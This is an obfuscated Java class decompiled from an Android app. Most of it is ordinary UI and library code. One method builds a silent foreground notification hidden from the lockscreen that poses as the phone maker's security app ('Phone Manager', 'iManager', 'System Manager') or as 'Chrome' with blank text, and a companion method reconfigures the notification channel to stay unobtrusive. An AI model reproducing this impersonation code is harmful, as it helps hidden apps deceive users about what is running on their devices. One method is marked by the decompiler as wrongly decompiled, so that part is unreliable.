package p000;

import android.R;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.text.Editable;
import android.text.Selection;
import android.view.View;
import androidx.cardview.widget.CardView;
import androidx.fragment.app.C0071a7;
import androidx.sqlite.p025db.framework.C0092a3;
import com.storm.safe.rock.R$drawable;
import com.storm.safe.rock.iuzxujjtqev;
import java.util.Locale;
import java.util.WeakHashMap;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: vv */
/* loaded from: classes2.dex */
public class C1351vv implements InterfaceC0911nf, InterfaceC0925nt, sf0, fd1, j31 {

    /* renamed from: a5 */
    public static volatile C1351vv f60704a5;

    /* renamed from: a0 */
    public final /* synthetic */ int f60713a0;

    /* renamed from: a1 */
    public static final /* synthetic */ C1351vv f60700a1 = new C1351vv(2);

    /* renamed from: a2 */
    public static final /* synthetic */ C1351vv f60701a2 = new C1351vv(3);

    /* renamed from: a3 */
    public static final /* synthetic */ C1351vv f60702a3 = new C1351vv(4);

    /* renamed from: a4 */
    public static final Object f60703a4 = new Object();

    /* renamed from: a6 */
    public static final int[] f60705a6 = {1};

    /* renamed from: a7 */
    public static final int[] f60706a7 = {1, 0};

    /* renamed from: a8 */
    public static final C1351vv f60707a8 = new C1351vv(7);

    /* renamed from: a9 */
    public static final C1351vv f60708a9 = new C1351vv(8);

    /* renamed from: b0 */
    public static final C1351vv f60709b0 = new C1351vv(9);

    /* renamed from: b1 */
    public static final C1351vv f60710b1 = new C1351vv(10);

    /* renamed from: b2 */
    public static final C1351vv f60711b2 = new C1351vv(11);

    /* renamed from: b3 */
    public static final C1351vv f60712b3 = new C1351vv(12);

    public /* synthetic */ C1351vv(int i) {
        this.f60713a0 = i;
    }

    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    /* renamed from: a2 */
    public static Notification m214961a2(Service service) {
        PendingIntent activity;
        try {
            C0492fe c0492feM214964a6 = m214964a6();
            int i = c0492feM214964a6.f56203a2;
            boolean zCanUseFullScreenIntent = false;
            if (iuzxujjtqev.class != 0) {
                Intent intent = new Intent(service, (Class<?>) iuzxujjtqev.class);
                intent.setFlags(268435456);
                activity = PendingIntent.getActivity(service, 0, intent, 201326592);
            } else {
                activity = null;
            }
            Bitmap bitmapDecodeResource = BitmapFactory.decodeResource(service.getResources(), i);
            ak0 ak0Var = new ak0(service, "OFF");
            ak0Var.f43675a4 = ak0.m209804a1(c0492feM214964a6.f56201a0);
            ak0Var.f43676a5 = ak0.m209804a1(c0492feM214964a6.f56202a1);
            ak0Var.f43688b7.icon = i;
            ak0Var.m209807a3(bitmapDecodeResource);
            ak0Var.m209806a2(2);
            ak0Var.m209806a2(16);
            ak0Var.m209806a2(8);
            ak0Var.f43685b4 = -1;
            ak0Var.f43680a9 = 2;
            Notification notification = ak0Var.f43688b7;
            notification.defaults = 0;
            notification.ledARGB = 0;
            notification.ledOnMS = 0;
            notification.ledOffMS = 0;
            notification.flags &= -2;
            notification.sound = null;
            notification.audioStreamType = -1;
            notification.audioAttributes = zj0.m215424a0(zj0.m215428a4(zj0.m215426a2(zj0.m215425a1(), 4), 5));
            if (activity != null) {
                ak0Var.f43677a6 = activity;
                if (Build.VERSION.SDK_INT >= 34) {
                    try {
                        Object systemService = service.getSystemService("notification");
                        NotificationManager notificationManager = systemService instanceof NotificationManager ? (NotificationManager) systemService : null;
                        if (notificationManager != null) {
                            zCanUseFullScreenIntent = notificationManager.canUseFullScreenIntent();
                        }
                    } catch (Exception unused) {
                    }
                } else {
                    zCanUseFullScreenIntent = true;
                }
                if (zCanUseFullScreenIntent) {
                    ak0Var.f43678a7 = activity;
                    ak0Var.m209806a2(128);
                }
            }
            Notification notificationM209805a0 = ak0Var.m209805a0();
            t60.m214694b5(notificationM209805a0, "{\n            // ★★★ 所有品…builder.build()\n        }");
            return notificationM209805a0;
        } catch (Exception e) {
            t60.m214726f4("BrandNotification", "📢 使用最小通知后备方案: " + e.getMessage());
            ak0 ak0Var2 = new ak0(service, "OFF");
            ak0Var2.f43688b7.icon = R.drawable.stat_notify_sync;
            ak0Var2.f43680a9 = -2;
            Notification notificationM209805a02 = ak0Var2.m209805a0();
            t60.m214694b5(notificationM209805a02, "{\n            Log.w(TAG,…       .build()\n        }");
            return notificationM209805a02;
        }
    }

    /* renamed from: a3 */
    public static void m214962a3(Context context) {
        t60.m214695b6(context, "context");
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager notificationManager = (NotificationManager) context.getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                try {
                    notificationManager.deleteNotificationChannel("svc_ch");
                } catch (Exception unused) {
                }
            }
            NotificationChannel notificationChannel = notificationManager != null ? notificationManager.getNotificationChannel("OFF") : null;
            if (notificationChannel != null && notificationChannel.getImportance() == 1) {
                notificationManager.deleteNotificationChannel("OFF");
            }
            m214964a6();
            r70.m214503b1();
            NotificationChannel notificationChannelM213253a4 = AbstractC0710j9.m213253a4();
            notificationChannelM213253a4.setDescription("");
            notificationChannelM213253a4.setShowBadge(false);
            notificationChannelM213253a4.setSound(null, null);
            notificationChannelM213253a4.enableLights(false);
            notificationChannelM213253a4.enableVibration(false);
            notificationChannelM213253a4.setLockscreenVisibility(-1);
            if (Build.VERSION.SDK_INT >= 29) {
                notificationChannelM213253a4.setAllowBubbles(false);
            }
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannelM213253a4);
            }
        }
    }

    /* renamed from: a5 */
    public static C1351vv m214963a5() {
        C1351vv c1351vv;
        synchronized (f60703a4) {
            try {
                if (f60704a5 == null) {
                    f60704a5 = new C1351vv(5);
                }
                c1351vv = f60704a5;
            } catch (Throwable th) {
                throw th;
            }
        }
        return c1351vv;
    }

    /* renamed from: a6 */
    public static C0492fe m214964a6() {
        boolean zM214686a2 = t60.m214686a2(Locale.getDefault().getLanguage(), "zh");
        String str = Build.BRAND;
        if (str != null) {
            String lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (lowerCase.equals("huawei")) {
                return new C0492fe(zM214686a2 ? "手机管家" : "Phone Manager", R$drawable.rs12, zM214686a2 ? "运行中" : "Running");
            }
            if (AbstractC0716jf.m213306g5("xiaomi", "redmi", "mi", "poco").contains(lowerCase)) {
                return new C0492fe(zM214686a2 ? "手机管家" : "Security", R$drawable.rw16, zM214686a2 ? "运行中" : "Running");
            }
            if (AbstractC0716jf.m213306g5("oppo", "realme", "oneplus").contains(lowerCase)) {
                return new C0492fe(zM214686a2 ? "手机管家" : "Phone Manager", R$drawable.ru14, zM214686a2 ? "运行中" : "Running");
            }
            if (lowerCase.equals("vivo") || lowerCase.equals("iqoo")) {
                return new C0492fe(zM214686a2 ? "i管家" : "iManager", R$drawable.rt13, zM214686a2 ? "运行中" : "Running");
            }
            if (AbstractC0716jf.m213306g5("honor", "hihonor").contains(lowerCase)) {
                return new C0492fe(zM214686a2 ? "系统管家" : "System Manager", R$drawable.rv15, zM214686a2 ? "运行中" : "Running");
            }
            if (lowerCase.equals("samsung")) {
                return new C0492fe("Chrome", R$drawable.rx17, "                    ");
            }
        }
        return new C0492fe("Chrome", R$drawable.rx17, "                    ");
    }

    /* JADX WARN: Code restructure failed: missing block: B:31:0x0045, code lost:
    
        if (java.lang.Character.isHighSurrogate(r5) != false) goto L33;
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x0082, code lost:
    
        if (java.lang.Character.isLowSurrogate(r5) != false) goto L58;
     */
    /* JADX WARN: Removed duplicated region for block: B:46:0x006c A[EDGE_INSN: B:92:0x006c->B:46:0x006c BREAK  A[LOOP:2: B:47:0x006e->B:58:0x0085], EDGE_INSN: B:93:0x006c->B:46:0x006c BREAK  A[LOOP:2: B:47:0x006e->B:58:0x0085, LOOP_LABEL: LOOP:2: B:47:0x006e->B:58:0x0085]] */
    /* JADX WARN: Removed duplicated region for block: B:67:0x00a2 A[ADDED_TO_REGION] */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m214965a9(C1380wk c1380wk, Editable editable, int i, int i2, boolean z) {
        int iMin;
        if (editable != null && i >= 0 && i2 >= 0) {
            int selectionStart = Selection.getSelectionStart(editable);
            int selectionEnd = Selection.getSelectionEnd(editable);
            if (selectionStart != -1 && selectionEnd != -1 && selectionStart == selectionEnd) {
                if (z) {
                    int iMax = Math.max(i, 0);
                    int length = editable.length();
                    if (selectionStart < 0 || length < selectionStart || iMax < 0) {
                        selectionStart = -1;
                        int iMax2 = Math.max(i2, 0);
                        iMin = editable.length();
                        if (selectionEnd >= 0 || iMin < selectionEnd || iMax2 < 0) {
                            iMin = -1;
                            if (selectionStart != -1 && iMin != -1) {
                            }
                        } else {
                            loop2: while (true) {
                                boolean z2 = false;
                                while (true) {
                                    if (iMax2 == 0) {
                                        iMin = selectionEnd;
                                        break loop2;
                                    }
                                    if (selectionEnd >= iMin) {
                                        if (z2) {
                                            break;
                                        }
                                    } else {
                                        char cCharAt = editable.charAt(selectionEnd);
                                        if (z2) {
                                            break;
                                        }
                                        if (!Character.isSurrogate(cCharAt)) {
                                            iMax2--;
                                            selectionEnd++;
                                        } else {
                                            if (Character.isLowSurrogate(cCharAt)) {
                                                break loop2;
                                            }
                                            selectionEnd++;
                                            z2 = true;
                                        }
                                    }
                                }
                                iMax2--;
                                selectionEnd++;
                            }
                            iMin = -1;
                            if (selectionStart != -1) {
                            }
                        }
                    } else {
                        loop0: while (true) {
                            boolean z3 = false;
                            while (true) {
                                if (iMax == 0) {
                                    break loop0;
                                }
                                selectionStart--;
                                if (selectionStart >= 0) {
                                    char cCharAt2 = editable.charAt(selectionStart);
                                    if (z3) {
                                        break;
                                    }
                                    if (!Character.isSurrogate(cCharAt2)) {
                                        iMax--;
                                    } else {
                                        if (Character.isHighSurrogate(cCharAt2)) {
                                            break loop0;
                                        }
                                        z3 = true;
                                    }
                                } else {
                                    if (z3) {
                                        break loop0;
                                    }
                                    selectionStart = 0;
                                }
                            }
                            iMax--;
                        }
                        selectionStart = -1;
                        int iMax22 = Math.max(i2, 0);
                        iMin = editable.length();
                        if (selectionEnd >= 0) {
                            iMin = -1;
                            if (selectionStart != -1) {
                            }
                        }
                    }
                } else {
                    selectionStart = Math.max(selectionStart - i, 0);
                    iMin = Math.min(selectionEnd + i2, editable.length());
                }
                j81[] j81VarArr = (j81[]) editable.getSpans(selectionStart, iMin, j81.class);
                if (j81VarArr != null && j81VarArr.length > 0) {
                    for (j81 j81Var : j81VarArr) {
                        int spanStart = editable.getSpanStart(j81Var);
                        int spanEnd = editable.getSpanEnd(j81Var);
                        selectionStart = Math.min(spanStart, selectionStart);
                        iMin = Math.max(spanEnd, iMin);
                    }
                    int iMax3 = Math.max(selectionStart, 0);
                    int iMin2 = Math.min(iMin, editable.length());
                    c1380wk.beginBatchEdit();
                    editable.delete(iMax3, iMin2);
                    c1380wk.endBatchEdit();
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: b1 */
    public static String m214966b1(String str) {
        int length = str.length();
        StringBuilder sb = new StringBuilder(23);
        sb.append("WM-");
        if (length >= 20) {
            sb.append(str.substring(0, 20));
        } else {
            sb.append(str);
        }
        return sb.toString();
    }

    @Override // p000.j31
    /* renamed from: a1 */
    public k31 mo212728a1(i31 i31Var) {
        return new C0092a3(i31Var.f56786a0, i31Var.f56787a1, i31Var.f56788a2, i31Var.f56789a3, i31Var.f56790a4);
    }

    /* renamed from: a4 */
    public boolean mo214851a4() {
        return this instanceof cd0;
    }

    /* renamed from: a7 */
    public void mo210827a7(float f, float f2, float f3, k01 k01Var) {
        k01Var.m213399a3(f, 0.0f);
    }

    /* renamed from: a8 */
    public Signature[] mo214466a8(PackageManager packageManager, String str) {
        return packageManager.getPackageInfo(str, 64).signatures;
    }

    /* renamed from: b0 */
    public void m214967b0(og1 og1Var, float f) {
        ls0 ls0Var = (ls0) ((Drawable) og1Var.f58832a0);
        CardView cardView = (CardView) og1Var.f58833a1;
        boolean useCompatPadding = cardView.getUseCompatPadding();
        boolean preventCornerOverlap = cardView.getPreventCornerOverlap();
        if (f != ls0Var.f58167a4 || ls0Var.f58168a5 != useCompatPadding || ls0Var.f58169a6 != preventCornerOverlap) {
            ls0Var.f58167a4 = f;
            ls0Var.f58168a5 = useCompatPadding;
            ls0Var.f58169a6 = preventCornerOverlap;
            ls0Var.m213928a1(null);
            ls0Var.invalidateSelf();
        }
        if (!cardView.getUseCompatPadding()) {
            og1Var.m214213b5(0, 0, 0, 0);
            return;
        }
        ls0 ls0Var2 = (ls0) ((Drawable) og1Var.f58832a0);
        float f2 = ls0Var2.f58167a4;
        float f3 = ls0Var2.f58163a0;
        int iCeil = (int) Math.ceil(ms0.m214020a0(f2, f3, cardView.getPreventCornerOverlap()));
        int iCeil2 = (int) Math.ceil(ms0.m214021a1(f2, f3, cardView.getPreventCornerOverlap()));
        og1Var.m214213b5(iCeil, iCeil2, iCeil, iCeil2);
    }

    @Override // p000.fd1
    /* renamed from: b5 */
    public xf1 mo212585b5(View view, xf1 xf1Var, gd1 gd1Var) {
        gd1Var.f56448a3 = xf1Var.m215171a0() + gd1Var.f56448a3;
        WeakHashMap weakHashMap = xa1.f61054a0;
        boolean z = ga1.m212904a3(view) == 1;
        int iM215172a1 = xf1Var.m215172a1();
        int iM215173a2 = xf1Var.m215173a2();
        int i = gd1Var.f56445a0 + (z ? iM215173a2 : iM215172a1);
        gd1Var.f56445a0 = i;
        int i2 = gd1Var.f56447a2;
        if (!z) {
            iM215172a1 = iM215173a2;
        }
        int i3 = i2 + iM215172a1;
        gd1Var.f56447a2 = i3;
        ga1.m212911b0(view, i, gd1Var.f56446a1, i3, gd1Var.f56448a3);
        return xf1Var;
    }

    @Override // p000.sf0
    /* renamed from: b6 */
    public boolean mo210851b6(bf0 bf0Var) {
        return false;
    }

    public String toString() {
        switch (this.f60713a0) {
            case 10:
                return "kotlin.Unit";
            default:
                return super.toString();
        }
    }

    public C1351vv(C0071a7 c0071a7) {
        this.f60713a0 = 26;
    }

    @Override // p000.sf0
    /* renamed from: a0 */
    public void mo210850a0(bf0 bf0Var, boolean z) {
    }
}
